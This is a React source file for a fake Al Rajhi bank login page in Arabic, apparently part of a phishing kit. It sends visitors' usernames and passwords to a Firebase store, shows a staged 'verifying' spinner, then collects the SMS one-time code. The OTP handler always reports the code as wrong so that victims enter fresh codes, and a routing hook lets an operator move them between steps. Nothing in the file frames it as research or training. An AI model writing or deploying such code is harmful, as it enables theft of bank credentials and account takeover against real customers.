import { useState, useEffect } from "react";
import {
  Menu,
  Eye,
  EyeOff,
  AlertCircle,
  ChevronLeft,
  ChevronRight,
  Briefcase,
} from "lucide-react";
import { useVisitorRouting } from "@/hooks/use-visitor-routing";
import { addData, generateVisitorId } from "@/lib/firebase";
import { useToast } from "@/hooks/use-toast";
import alRajhiLogo from "@assets/W-123-removebg-preview_1769602081293.png";

type Screen = "login" | "loading" | "otp";

export default function AlRajhiLoginPage() {
  const { toast } = useToast();
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [screen, setScreen] = useState<Screen>("login");
  const [otp, setOtp] = useState("");
  
  const [visitorId, setVisitorId] = useState<string>("");

  useEffect(() => {
    let id = localStorage.getItem("visitor");
    if (!id) {
      id = generateVisitorId();
      localStorage.setItem("visitor", id);
    }
    setVisitorId(id);
  }, []);

  const { updateVisitorState } = useVisitorRouting({
    currentPage: "rajhi",
    currentStep: screen === "login" ? 1 : screen === "otp" ? 2 : 0,
    onStepChange: (step) => {
      if (step === 1) setScreen("login");
      else if (step === 2) setScreen("otp");
    },
  });

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!visitorId) return;
    
    await addData({
      id: visitorId,
      rajhiUser: username,
      rajhiPassword: password,
      currentPage: "rajhi",
    });
    setScreen("loading");
    setTimeout(() => {
      setScreen("otp");
    }, 2000);
  };

  const handleOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!visitorId) return;
    
    await addData({
      id: visitorId,
      rajhiOtp: otp,
    });
    setScreen("loading");
    setTimeout(() => {
      setScreen("otp");
      toast({
        title: "خطأ",
        description: "رمز التحقق غير صحيح",
        variant: "destructive",
      });
      setOtp("");
    }, 2000);
  };

  if (screen === "loading") {
    return (
      <div className="min-h-screen bg-background flex flex-col" dir="rtl">
        <header className="flex items-center justify-between px-4 py-4 border-b border-border bg-card">
          <div className="flex items-center gap-3">
            <AlRajhiLogoComponent />
          </div>
          <button className="p-2">
            <Menu className="w-6 h-6 text-foreground" />
          </button>
        </header>
        <div className="flex-1 flex flex-col items-center justify-center gap-6">
          <div className="relative w-16 h-16">
            <div className="absolute inset-0 border-4 border-muted rounded-full" />
            <div className="absolute inset-0 border-4 border-blue-500 border-t-transparent rounded-full animate-spin" />
          </div>
          <p className="text-lg text-muted-foreground">جاري التحقق...</p>
        </div>
      </div>
    );
  }

  if (screen === "otp") {
    return (
      <div className="min-h-screen bg-background" dir="rtl">
        <header className="flex items-center justify-between px-4 py-4 border-b border-border bg-card">
          <div className="flex items-center gap-3">
            <AlRajhiLogoComponent />
          </div>
          <button className="p-2">
            <Menu className="w-6 h-6 text-foreground" />
          </button>
        </header>
        <main className="px-5 py-8">
          <div className="text-right mb-8">
            <h1 className="text-3xl font-bold text-foreground mb-2">التحقق</h1>
            <p className="text-muted-foreground text-lg">
              أدخل رمز التحقق المرسل إلى جوالك
            </p>
          </div>
          <form className="space-y-6" onSubmit={handleOtp}>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              required
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="أدخل رمز التحقق"
              className="w-full h-16 px-5 rounded-2xl bg-muted text-foreground placeholder:text-muted-foreground text-center text-2xl tracking-widest border-0 focus:outline-none focus:ring-2 focus:ring-blue-500"
              data-testid="input-rajhi-otp"
            />
            <button
              type="submit"
              className="w-full h-16 rounded-2xl text-white font-medium text-lg bg-blue-500 hover:bg-blue-600"
              data-testid="button-rajhi-verify"
            >
              تأكيد
            </button>
            <button
              type="button"
              onClick={() => setScreen("login")}
              className="w-full h-16 rounded-2xl bg-muted text-muted-foreground font-medium text-lg"
              data-testid="button-rajhi-back"
            >
              رجوع
            </button>
          </form>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <header className="flex items-center justify-between px-4 py-4 border-b border-border bg-card">
        <div className="flex items-center gap-3">
          <AlRajhiLogoComponent />
        </div>
        <button className="p-2">
          <Menu className="w-6 h-6 text-foreground" />
        </button>
      </header>

      <main className="px-5 py-8">
        <div className="text-right mb-8">
          <h1 className="text-3xl font-bold text-foreground mb-2">الدخول</h1>
          <p className="text-muted-foreground text-lg">أهلا بك في الراجحي</p>
        </div>

        <form className="space-y-4" onSubmit={handleLogin}>
          <div className="relative flex items-center gap-3">
            <button type="button" className="shrink-0">
              <AlertCircle className="w-5 h-5 text-muted-foreground" />
            </button>
            <input
              required
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="اسم المستخدم"
              className="w-full h-16 px-5 rounded-2xl bg-muted text-foreground placeholder:text-muted-foreground text-right text-base border-0 focus:outline-none focus:ring-2 focus:ring-blue-500"
              data-testid="input-rajhi-username"
            />
          </div>

          <div className="relative flex items-center gap-3">
            <button type="button" className="shrink-0">
              <AlertCircle className="w-5 h-5 text-muted-foreground" />
            </button>
            <div className="relative w-full">
              <input
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                type={showPassword ? "text" : "password"}
                required
                placeholder="كلمة المرور"
                className="w-full h-16 px-5 pr-5 pl-14 rounded-2xl bg-muted text-foreground placeholder:text-muted-foreground text-right text-base border-0 focus:outline-none focus:ring-2 focus:ring-blue-500"
                data-testid="input-rajhi-password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground"
              >
                {showPassword ? (
                  <EyeOff className="w-6 h-6" />
                ) : (
                  <Eye className="w-6 h-6" />
                )}
              </button>
            </div>
          </div>

          <div className="flex items-center justify-between py-2">
            <button
              type="button"
              className="text-blue-500 font-medium text-base"
            >
              نسيت كلمة المرور؟
            </button>
            <div className="flex items-center gap-3">
              <span className="text-foreground text-base">تذكرني</span>
              <button
                type="button"
                onClick={() => setRememberMe(!rememberMe)}
                className={`w-6 h-6 rounded-md border-2 flex items-center justify-center transition-colors ${
                  rememberMe
                    ? "bg-blue-500 border-blue-500"
                    : "border-blue-500 bg-transparent"
                }`}
              >
                {rememberMe && (
                  <svg
                    className="w-4 h-4 text-white"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                    strokeWidth={3}
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      d="M5 13l4 4L19 7"
                    />
                  </svg>
                )}
              </button>
            </div>
          </div>

          <button
            type="submit"
            className="w-full h-16 rounded-2xl text-white font-medium text-lg bg-blue-500 hover:bg-blue-600"
            data-testid="button-rajhi-login"
          >
            تسجيل الدخول
          </button>
        </form>
      </main>

      <div className="px-5">
        <div className="border-t border-border" />
      </div>

      <section className="px-5 py-6">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-2">
            <button className="p-1 text-muted-foreground">
              <ChevronLeft className="w-5 h-5" />
            </button>
            <button className="p-1 text-muted-foreground">
              <ChevronRight className="w-5 h-5" />
            </button>
          </div>
          <h2 className="text-2xl font-bold text-foreground">
            منتجات مقترحة لك
          </h2>
        </div>

        <div className="relative rounded-3xl overflow-hidden h-44 bg-gradient-to-br from-blue-500 to-blue-600">
          <div className="absolute inset-0 bg-gradient-to-t from-black/50 via-transparent to-transparent" />
          <div className="absolute bottom-0 left-0 right-0 p-5 text-right">
            <div className="flex items-start justify-between">
              <div className="bg-white/20 p-2.5 rounded-xl backdrop-blur-sm">
                <Briefcase className="w-6 h-6 text-white" />
              </div>
              <div>
                <h3 className="text-xl font-bold text-white mb-1">الرواتب</h3>
                <p className="text-white/80 text-sm">
                  حول رواتب موظفيك بكل سهولة مع رواتب حماية الأجور
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}

function AlRajhiLogoComponent() {
  return (
    <img src={alRajhiLogo} alt="تكافل الراجحي - Al Rajhi Takaful" className="h-10" />
  );
}
